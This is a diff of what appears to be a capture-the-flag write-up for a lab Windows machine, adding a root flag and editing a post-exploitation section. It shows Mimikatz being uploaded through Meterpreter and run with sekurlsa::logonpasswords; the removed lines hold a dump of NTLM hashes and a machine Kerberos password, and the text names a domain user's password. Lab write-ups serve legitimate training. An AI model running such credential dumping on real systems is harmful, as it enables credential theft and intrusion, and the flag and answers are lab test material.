@@ -241,6 +241,8 @@ more \users\administrator\desktop\root.txt
 PS C:\Windows\system32> 
 ~~~
 
+Root flag: `6e9a9fdc6f64e410a68b847bb4b404fa`
+
 # Post Exploitation
 
 [Mimikatz](files/mimikatz.exe) can be used to dump cached passwords. From the meterpreter session:
@@ -252,7 +254,7 @@ meterpreter > upload mimikatz.exe
 [*] uploaded   : mimikatz.exe -> mimikatz.exe
 ~~~
 
-We execute mimikatz and use the sekurlsa command to extract logon passwords:
+We execute mimikatz and use the `sekurlsa` command to extract logon passwords:
 
 ~~~
 PS C:\inetpub\wwwroot\wordpress\wp-content\uploads> ./mimikatz.exe
@@ -267,124 +269,7 @@ PS C:\inetpub\wwwroot\wordpress\wp-content\uploads> ./mimikatz.exe
 
 mimikatz # sekurlsa::logonpasswords
 
-Authentication Id : 0 ; 6560321 (00000000:00641a41)
-Session           : Service from 0
-User Name         : DefaultAppPool
-Domain            : IIS APPPOOL
-Logon Server      : (null)
-Logon Time        : 6/13/2020 10:23:30 AM
-SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
-	msv :	
-	 [00000003] Primary
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP
-	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
-	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
-	tspkg :	
-	wdigest :	
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP
-	 * Password : (null)
-	kerberos :	
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP.LOCAL
-	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
-	ssp :	
-	credman :	
-
-Authentication Id : 0 ; 65790 (00000000:000100fe)
-Session           : Interactive from 1
-User Name         : DWM-1
-Domain            : Window Manager
-Logon Server      : (null)
-Logon Time        : 6/13/2020 9:10:57 AM
-SID               : S-1-5-90-0-1
-	msv :	
-	 [00000003] Primary
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP
-	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
-	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
-	tspkg :	
-	wdigest :	
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP
-	 * Password : (null)
-	kerberos :	
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP.LOCAL
-	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
-	ssp :	
-	credman :	
-
-Authentication Id : 0 ; 65770 (00000000:000100ea)
-Session           : Interactive from 1
-User Name         : DWM-1
-Domain            : Window Manager
-Logon Server      : (null)
-Logon Time        : 6/13/2020 9:10:57 AM
-SID               : S-1-5-90-0-1
-	msv :	
-	 [00000003] Primary
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP
-	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
-	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
-	tspkg :	
-	wdigest :	
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP
-	 * Password : (null)
-	kerberos :	
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP.LOCAL
-	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
-	ssp :	
-	credman :	
-
-Authentication Id : 0 ; 996 (00000000:000003e4)
-Session           : Service from 0
-User Name         : SHIELD$
-Domain            : MEGACORP
-Logon Server      : (null)
-Logon Time        : 6/13/2020 9:10:56 AM
-SID               : S-1-5-20
-	msv :	
-	 [00000003] Primary
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP
-	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
-	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
-	tspkg :	
-	wdigest :	
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP
-	 * Password : (null)
-	kerberos :	
-	 * Username : shield$
-	 * Domain   : MEGACORP.LOCAL
-	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
-	ssp :	
-	credman :	
-
-Authentication Id : 0 ; 35995 (00000000:00008c9b)
-Session           : UndefinedLogonType from 0
-User Name         : (null)
-Domain            : (null)
-Logon Server      : (null)
-Logon Time        : 6/13/2020 9:10:55 AM
-SID               : 
-	msv :	
-	 [00000003] Primary
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP
-	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
-	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
-	tspkg :	
-	wdigest :	
-	kerberos :	
-	ssp :	
-	credman :	
+[REDACTED]
 
 Authentication Id : 0 ; 305742 (00000000:0004aa4e)
 Session           : Interactive from 1
@@ -412,89 +297,8 @@ SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
 	ssp :	
 	credman :	
 
-Authentication Id : 0 ; 220797 (00000000:00035e7d)
-Session           : Service from 0
-User Name         : wordpress
-Domain            : IIS APPPOOL
-Logon Server      : (null)
-Logon Time        : 6/13/2020 9:11:35 AM
-SID               : S-1-5-82-698136220-2753279940-1413493927-70316276-1736946139
-	msv :	
-	 [00000003] Primary
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP
-	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
-	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
-	tspkg :	
-	wdigest :	
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP
-	 * Password : (null)
-	kerberos :	
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP.LOCAL
-	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
-	ssp :	
-	credman :	
+[REDACTED]
 
-Authentication Id : 0 ; 995 (00000000:000003e3)
-Session           : Service from 0
-User Name         : IUSR
-Domain            : NT AUTHORITY
-Logon Server      : (null)
-Logon Time        : 6/13/2020 9:11:03 AM
-SID               : S-1-5-17
-	msv :	
-	tspkg :	
-	wdigest :	
-	 * Username : (null)
-	 * Domain   : (null)
-	 * Password : (null)
-	kerberos :	
-	ssp :	
-	credman :	
-
-Authentication Id : 0 ; 997 (00000000:000003e5)
-Session           : Service from 0
-User Name         : LOCAL SERVICE
-Domain            : NT AUTHORITY
-Logon Server      : (null)
-Logon Time        : 6/13/2020 9:10:57 AM
-SID               : S-1-5-19
-	msv :	
-	tspkg :	
-	wdigest :	
-	 * Username : (null)
-	 * Domain   : (null)
-	 * Password : (null)
-	kerberos :	
-	 * Username : (null)
-	 * Domain   : (null)
-	 * Password : (null)
-	ssp :	
-	credman :	
-
-Authentication Id : 0 ; 999 (00000000:000003e7)
-Session           : UndefinedLogonType from 0
-User Name         : SHIELD$
-Domain            : MEGACORP
-Logon Server      : (null)
-Logon Time        : 6/13/2020 9:10:55 AM
-SID               : S-1-5-18
-	msv :	
-	tspkg :	
-	wdigest :	
-	 * Username : SHIELD$
-	 * Domain   : MEGACORP
-	 * Password : (null)
-	kerberos :	
-	 * Username : shield$
-	 * Domain   : MEGACORP.LOCAL
-	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
-	ssp :	
-	credman :	
-
-mimikatz # 
 ~~~
 
-And we find the password Password1234! for domain user Sandra.
+And we find the password `Password1234!` for domain user `Sandra`.
